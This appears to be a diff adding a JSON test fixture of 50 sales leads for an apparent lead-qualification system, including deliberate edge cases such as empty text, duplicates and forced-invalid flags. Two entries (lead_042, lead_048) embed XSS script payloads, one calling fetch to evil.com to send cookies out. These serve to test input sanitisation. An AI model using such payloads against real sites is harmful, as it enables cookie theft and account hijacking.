@@ -1,0 +1,468 @@
+[
+  {
+    "id": "lead_001",
+    "raw_text": "Enterprise client requested a demo of our full platform. Budget confirmed at 50,000 EUR annually. CFO and CTO both attending the call.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "500+"
+    }
+  },
+  {
+    "id": "lead_002",
+    "raw_text": "Large logistics company needs end-to-end workflow automation for 200+ staff. Urgent timeline, go-live required in 6 weeks. CTO contacted us directly via LinkedIn.",
+    "metadata": {
+      "source": "linkedin",
+      "region": "DE",
+      "company_size": "200+"
+    }
+  },
+  {
+    "id": "lead_003",
+    "raw_text": "Fortune 500 retail company requires immediate ERP integration. Legal and procurement teams already engaged. Formal RFP issued. Budget 120,000 EUR.",
+    "metadata": {
+      "source": "referral",
+      "region": "US",
+      "company_size": "10000+"
+    }
+  },
+  {
+    "id": "lead_004",
+    "raw_text": "Repeat client looking to expand current contract. Currently paying 1,800 EUR per month. Satisfied with results and wants to add three new automated workflows.",
+    "metadata": {
+      "source": "crm",
+      "region": "UK",
+      "company_size": "50-200"
+    }
+  },
+  {
+    "id": "lead_005",
+    "raw_text": "Healthcare group managing 12 clinics wants to automate patient intake and reporting. Compliance team involved. Decision maker is the COO.",
+    "metadata": {
+      "source": "trade_show",
+      "region": "EU",
+      "company_size": "200+"
+    }
+  },
+  {
+    "id": "lead_006",
+    "raw_text": "Series B startup, 80 employees, raised 15M EUR last month. CTO looking to replace manual operations with AI-driven automation. Budget approved for Q2.",
+    "metadata": {
+      "source": "email",
+      "region": "EU",
+      "company_size": "50-200"
+    }
+  },
+  {
+    "id": "lead_007",
+    "raw_text": "Global manufacturing firm needs automation across 5 departments. Vendor evaluation underway. Our solution is shortlisted. Meeting with VP Operations next week.",
+    "metadata": {
+      "source": "partner_referral",
+      "region": "US",
+      "company_size": "5000+"
+    }
+  },
+  {
+    "id": "lead_008",
+    "raw_text": "Private equity firm automating deal flow management. Partner-level sign-off already given. Wants to start immediately. Budget 80,000 EUR for full implementation.",
+    "metadata": {
+      "source": "direct",
+      "region": "UK",
+      "company_size": "50-200"
+    }
+  },
+  {
+    "id": "lead_009",
+    "raw_text": "Regional bank wants to automate loan application processing. Compliance and IT sign-off complete. Pilot project budget 40,000 EUR with full rollout to follow.",
+    "metadata": {
+      "source": "conference",
+      "region": "MT",
+      "company_size": "500+"
+    }
+  },
+  {
+    "id": "lead_010",
+    "raw_text": "E-commerce company processing 10,000 orders per day needs automated exception handling and escalation routing. Technical team ready to integrate immediately.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "200+"
+    }
+  },
+  {
+    "id": "lead_011",
+    "raw_text": "Insurance company wants AI to triage claims before human review. Already using competitor, actively evaluating switch. Decision in 30 days. Legal team briefed.",
+    "metadata": {
+      "source": "inbound_call",
+      "region": "DE",
+      "company_size": "1000+"
+    }
+  },
+  {
+    "id": "lead_012",
+    "raw_text": "Telecoms operator automating customer churn prediction and outreach. Data team already mapped integration points. Pilot budget confirmed at 25,000 EUR.",
+    "metadata": {
+      "source": "linkedin",
+      "region": "EU",
+      "company_size": "500+"
+    }
+  },
+  {
+    "id": "lead_013",
+    "raw_text": "Law firm with 200 lawyers needs document automation and contract review pipeline. Managing partner involved. Timeline 3 months. RFP sent.",
+    "metadata": {
+      "source": "referral",
+      "region": "UK",
+      "company_size": "200+"
+    }
+  },
+  {
+    "id": "lead_014",
+    "raw_text": "Logistics startup backed by 30M EUR funding round needs to scale operations without hiring. Automation-first mandate from board. CEO reaching out directly.",
+    "metadata": {
+      "source": "direct",
+      "region": "EU",
+      "company_size": "50-200"
+    }
+  },
+  {
+    "id": "lead_015",
+    "raw_text": "Pharmaceutical company requires automated regulatory document processing. Compliance officer and CIO both on initial call. Six-figure budget pre-approved.",
+    "metadata": {
+      "source": "conference",
+      "region": "EU",
+      "company_size": "5000+"
+    }
+  },
+  {
+    "id": "lead_016",
+    "raw_text": "Student researching AI tools for a university dissertation on automation trends in SMEs.",
+    "metadata": {
+      "source": "contact_form",
+      "region": "MT",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_017",
+    "raw_text": "Someone asked a general question about pricing on the website. Left no contact info and no company details.",
+    "metadata": {
+      "source": "chatbot",
+      "region": "unknown",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_018",
+    "raw_text": "Small startup with 3 people exploring automation options. Budget is under 500 EUR. No specific timeline or use case defined yet.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "1-10"
+    }
+  },
+  {
+    "id": "lead_019",
+    "raw_text": "Freelancer asking if the platform supports solo users. No company, no team, no stated budget.",
+    "metadata": {
+      "source": "chatbot",
+      "region": "EU",
+      "company_size": "1"
+    }
+  },
+  {
+    "id": "lead_020",
+    "raw_text": "Someone browsing the blog clicked the contact form and asked a general question about what AI automation means.",
+    "metadata": {
+      "source": "blog_cta",
+      "region": "unknown",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_021",
+    "raw_text": "High school teacher curious about AI for classroom projects. Not a business inquiry.",
+    "metadata": {
+      "source": "contact_form",
+      "region": "MT",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_022",
+    "raw_text": "Retired professional exploring tech trends. No business context. No budget. Just curious.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_023",
+    "raw_text": "Person asking if there is a free tier. No company mentioned. No use case. Just wants to try it for free.",
+    "metadata": {
+      "source": "chatbot",
+      "region": "EU",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_024",
+    "raw_text": "NGO volunteer asking about discounted pricing for non-profits. No budget confirmed, no decision maker, exploratory only.",
+    "metadata": {
+      "source": "email",
+      "region": "EU",
+      "company_size": "1-10"
+    }
+  },
+  {
+    "id": "lead_025",
+    "raw_text": "Intern at a small company doing competitive research on automation tools. No purchasing authority. Report going to a manager.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "10-50"
+    }
+  },
+  {
+    "id": "lead_026",
+    "raw_text": "Director at a financial services firm. Interested in the solution but said budget is frozen until Q3. Asked to follow up in 4 months.",
+    "metadata": {
+      "source": "email",
+      "region": "EU",
+      "company_size": "200+"
+    }
+  },
+  {
+    "id": "lead_027",
+    "raw_text": "Agency partner wants to resell the solution to their clients. No direct end-user budget. Asking about white-label and referral commission terms.",
+    "metadata": {
+      "source": "partner_portal",
+      "region": "EU",
+      "company_size": "10-50"
+    }
+  },
+  {
+    "id": "lead_028",
+    "raw_text": "Asking detailed technical questions about architecture. No stated business need. Possibly a competitor benchmarking.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_029",
+    "raw_text": "Journalist writing an article about AI automation tools. Wants a product demo for editorial purposes. No purchase intent stated.",
+    "metadata": {
+      "source": "press_inquiry",
+      "region": "UK",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_030",
+    "raw_text": "Consultant evaluating tools on behalf of a client. Will not disclose the client name. Budget and timeline unknown until client approves.",
+    "metadata": {
+      "source": "email",
+      "region": "EU",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_031",
+    "raw_text": "Manager at a mid-size company mentioned interest in automation. Seemed engaged but vague on specifics. No budget or timeline confirmed.",
+    "metadata": {
+      "source": "trade_show",
+      "region": "EU",
+      "company_size": "50-200"
+    }
+  },
+  {
+    "id": "lead_032",
+    "raw_text": "Company with 500 employees, someone from IT reached out. Not sure if they have budget authority. Wants to explore options.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "500+"
+    }
+  },
+  {
+    "id": "lead_033",
+    "raw_text": "Operations director left a voicemail expressing interest. Has not responded to follow-up emails. Company looks like a good fit but engagement is cold.",
+    "metadata": {
+      "source": "crm",
+      "region": "DE",
+      "company_size": "200+"
+    }
+  },
+  {
+    "id": "lead_034",
+    "raw_text": "Enterprise company, 1000+ staff. Someone booked a demo but gave minimal information about their use case. Could be a great fit or wrong department contact.",
+    "metadata": {
+      "source": "demo_booking",
+      "region": "US",
+      "company_size": "1000+"
+    }
+  },
+  {
+    "id": "lead_035",
+    "raw_text": "Head of digital transformation at a large retailer. Showed interest at conference but gave a personal email not corporate. Follow-up has been slow.",
+    "metadata": {
+      "source": "conference",
+      "region": "EU",
+      "company_size": "1000+"
+    }
+  },
+  {
+    "id": "lead_036",
+    "raw_text": "asdflkjh random gibberish text with no meaning whatsoever 123 abc xyz",
+    "metadata": {
+      "source": "api",
+      "region": null,
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_037",
+    "raw_text": "Small startup exploring options. Budget under 2,000 EUR total. No specific timeline.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "1-10"
+    },
+    "_force_invalid": "bad_category"
+  },
+  {
+    "id": "lead_038",
+    "raw_text": "Mid-size company looking at options. Reasonable budget. Some urgency.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "50-200"
+    },
+    "_force_invalid": "confidence_out_of_range"
+  },
+  {
+    "id": "lead_039",
+    "raw_text": "Enterprise client, confirmed budget, decision maker involved, urgent timeline.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "500+"
+    },
+    "_force_invalid": "empty_reason"
+  },
+  {
+    "id": "lead_040",
+    "raw_text": "",
+    "metadata": {
+      "source": "api",
+      "region": "EU",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_041",
+    "raw_text": "     ",
+    "metadata": {
+      "source": "api",
+      "region": null,
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_042",
+    "raw_text": "<script>alert('xss')</script><p>Interested in your product</p>",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": null
+    }
+  },
+  {
+    "id": "lead_043",
+    "raw_text": "Company with genuine need and some budget signals but vague on decision maker. Could go either way.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "50-200"
+    },
+    "_target_confidence": 0.6
+  },
+  {
+    "id": "lead_044",
+    "raw_text": "Operations manager with decent budget, clear use case, but no urgency and no executive sponsor confirmed.",
+    "metadata": {
+      "source": "email",
+      "region": "EU",
+      "company_size": "50-200"
+    },
+    "_target_confidence": 0.62
+  },
+  {
+    "id": "lead_045",
+    "raw_text": "Interested company but budget approval still pending. Good fit technically, weak on commercial readiness.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "200+"
+    },
+    "_target_confidence": 0.58
+  },
+  {
+    "id": "lead_046",
+    "raw_text": "CFO from a fintech company resubmitting after initial contact 2 weeks ago. Now has board approval and confirmed budget of 60,000 EUR.",
+    "metadata": {
+      "source": "crm",
+      "region": "EU",
+      "company_size": "200+"
+    }
+  },
+  {
+    "id": "lead_046",
+    "raw_text": "CFO from a fintech company follow-up submission. Budget increased to 75,000 EUR. Wants to start next month.",
+    "metadata": {
+      "source": "crm",
+      "region": "EU",
+      "company_size": "200+",
+      "resubmission": true
+    }
+  },
+  {
+    "id": "lead_047",
+    "raw_text": "We are a global enterprise operating across 47 countries with over 25,000 employees. Our operations team has been evaluating automation vendors for the past 18 months. We have a dedicated transformation budget of 2.5 million EUR for this fiscal year. The use cases include: automated procurement approval workflows, supplier onboarding automation, invoice processing, HR onboarding sequences, compliance document generation, customer escalation routing, real-time inventory alerting, predictive maintenance scheduling, contract renewal tracking, vendor performance scoring, employee expense automation, IT ticket triage, data quality validation across 12 internal systems, automated regulatory reporting for 9 jurisdictions, real-time fraud detection flagging, customer segmentation pipeline, partner commission calculation, SLA breach alerting, monthly P&L report generation, and quarterly board report compilation. Our CIO, CFO, and Chief Transformation Officer are all sponsors. We have a shortlist of 3 vendors and are conducting final evaluations this month. Decision will be made by end of quarter. We are prepared to sign a 3-year contract. Legal and procurement are already briefed and ready to move. This is our highest priority initiative for the year.",
+    "metadata": {
+      "source": "rfp_portal",
+      "region": "US",
+      "company_size": "25000+"
+    }
+  },
+  {
+    "id": "lead_048",
+    "raw_text": "<b>Company Name</b><script>fetch('http://evil.com?data=cookie')</script> We are interested in your enterprise plan. Budget available.",
+    "metadata": {
+      "source": "web_form",
+      "region": "EU",
+      "company_size": "50-200"
+    }
+  },
+  {
+    "id": "lead_049",
+    "raw_text": "Unternehmensberatung GmbH sucht eine Automatisierungsloesung fuer unser Team von 150 Mitarbeitern. Budget vorhanden. Entscheider ist der Geschaeftsfuehrer.",
+    "metadata": {
+      "source": "web_form",
+      "region": "DE",
+      "company_size": "100-200"
+    }
+  },
+  {
+    "id": "lead_050",
+    "raw_text": "Hi",
+    "metadata": {
+      "source": "chatbot",
+      "region": null,
+      "company_size": null
+    }
+  }
+]
